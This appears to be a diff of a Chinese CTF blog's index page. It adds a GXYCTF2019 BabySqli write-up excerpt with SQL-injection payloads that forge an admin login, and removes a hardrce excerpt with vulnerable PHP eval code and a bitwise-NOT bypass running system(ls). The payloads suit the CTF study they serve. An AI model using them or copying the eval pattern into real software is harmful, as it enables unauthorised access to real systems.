@@ -131,6 +131,44 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/07/16/GXYCTF2019-BabySqli-wp/" >GXYCTF2019-BabySqli-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-16
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>查看页面源码看到字符串  MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>
+<p>base32+base64解密后得到 <code>select * from user where username = &#39;$name&#39;</code></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>登录  用户名只能为admin  发现name字段可以替换空格注入  但信息无回显</p>
+<p>可以联合注入3个字段  经尝试发现第二个字段为用户名  使其为admin即可   </p>
+<p>尝试密码传数组得到warning：<code>Warning: md5() expects parameter 1 to be string, array given in /var/www/html/search.php on line 27</code></p>
+<p>猜测判断逻辑应该为 将数据库中取出的password和md5($pw)比较</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=admin<span class="string">&#x27;/**/union/**/select/**/1,&#x27;</span>admin<span class="string">&#x27;,NULL/**/limit/**/1,1%23&amp;pw[]=1</span></span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=admin<span class="string">&#x27;/**/union/**/select/**/1,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span><span class="number">0</span>cc175b9c0f1b6a831c399e269772661<span class="string">&#x27;/**/limit/**/1,1%23&amp;pw=a</span></span><br><span class="line"><span class="string">// 0cc175b9c0f1b6a831c399e269772661 == md5(&#x27;</span>a<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/07/16/GXYCTF2019-BabySqli-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/07/16/web-upload-labs/" >upload-labs搭建及攻略</a>
 								</h3>
 							</div>
@@ -636,42 +674,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/08/SWPUCTF2021-hardrce-wp/" >SWPUCTF2021-hardrce-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-08
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/439">题目链接</a>   </p>
-<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><p>屏蔽字母和若干符号</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<h2 id="url编码取反绕过"><a href="#url编码取反绕过" class="headerlink" title="url编码取反绕过"></a>url编码取反绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;~&quot;</span> . <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># system: ~%8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="comment"># ls: ~%93%8C</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="构造发送"><a href="#构造发送" class="headerlink" title="构造发送"></a>构造发送</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">93</span>%<span class="number">8</span>C);	<span class="comment"># 相当于system(ls);</span></span><br></pre></td></tr></table></figure>
-
-
-
-	
-	</div>
-  <a type="button" href="/2023/07/08/SWPUCTF2021-hardrce-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -731,7 +733,7 @@
 		
 			<li><a href="/categories/web-learning/">web-learning<span>2</span></a></li>
 		
-			<li><a href="/categories/web-wp/">web-wp<span>16</span></a></li>
+			<li><a href="/categories/web-wp/">web-wp<span>17</span></a></li>
 		
 		</ul>
 	</div>
@@ -742,48 +744,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>4</span></a></li>
-		
-			<li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
-		
-			<li><a href="/tags/thread/">thread<span>1</span></a></li>
-		
-			<li><a href="/tags/heap/">heap<span>2</span></a></li>
-		
-			<li><a href="/tags/CVE/">CVE<span>4</span></a></li>
-		
-			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
-		
-			<li><a href="/tags/sql/">sql<span>6</span></a></li>
-		
-			<li><a href="/tags/web/">web<span>18</span></a></li>
-		
-			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>10</span></a></li>
-		
-			<li><a href="/tags/fuzz/">fuzz<span>4</span></a></li>
+			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
 		
 			<li><a href="/tags/uaf/">uaf<span>1</span></a></li>
 		
-			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
-		
 			<li><a href="/tags/php/">php<span>10</span></a></li>
 		
-			<li><a href="/tags/include/">include<span>1</span></a></li>
-		
-			<li><a href="/tags/unserialise/">unserialise<span>1</span></a></li>
-		
-			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
-		
-			<li><a href="/tags/canary/">canary<span>1</span></a></li>
-		
-			<li><a href="/tags/rce/">rce<span>1</span></a></li>
-		
-			<li><a href="/tags/stack/">stack<span>2</span></a></li>
+			<li><a href="/tags/upload/">upload<span>1</span></a></li>
 		
 			<li><a href="/tags/reverse/">reverse<span>7</span></a></li>
 		
+			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>4</span></a></li>
 		
-		   <li><a href="/tags">...<span>33</span></a></li>
+			<li><a href="/tags/fuzz/">fuzz<span>4</span></a></li>
+		
+			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>2</span></a></li>
+		
+			<li><a href="/tags/CVE/">CVE<span>4</span></a></li>
+		
+			<li><a href="/tags/pwn/">pwn<span>7</span></a></li>
+		
+			<li><a href="/tags/include/">include<span>1</span></a></li>
+		
+			<li><a href="/tags/thread/">thread<span>1</span></a></li>
+		
+			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
+		
+			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>10</span></a></li>
+		
+			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
+		
+			<li><a href="/tags/sql/">sql<span>7</span></a></li>
+		
+			<li><a href="/tags/stack/">stack<span>2</span></a></li>
+		
+			<li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
+		
+			<li><a href="/tags/BJDCTF2020/">BJDCTF2020<span>1</span></a></li>
+		
+			<li><a href="/tags/heap/">heap<span>2</span></a></li>
+		
+		
+		   <li><a href="/tags">...<span>34</span></a></li>
 		 
 		</ul>
 	</div>
@@ -794,6 +796,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/07/16/GXYCTF2019-BabySqli-wp/" ><i class="fa fa-file-o"></i>GXYCTF2019-BabySqli-wp</a>
+      </li>
     
       <li>
         <a href="/2023/07/16/web-upload-labs/" ><i class="fa fa-file-o"></i>upload-labs搭建及攻略</a>
@@ -809,10 +815,6 @@
     
       <li>
         <a href="/2023/07/12/第五空间2021-yasqlin-wp/" ><i class="fa fa-file-o"></i>第五空间2021-yet_another_mysql_...</a>
-      </li>
-    
-      <li>
-        <a href="/2023/07/11/SWPUCTF2022-ezsql-wp/" ><i class="fa fa-file-o"></i>SWPUCTF2022-ezsql-wp</a>
       </li>
     
   </ul>
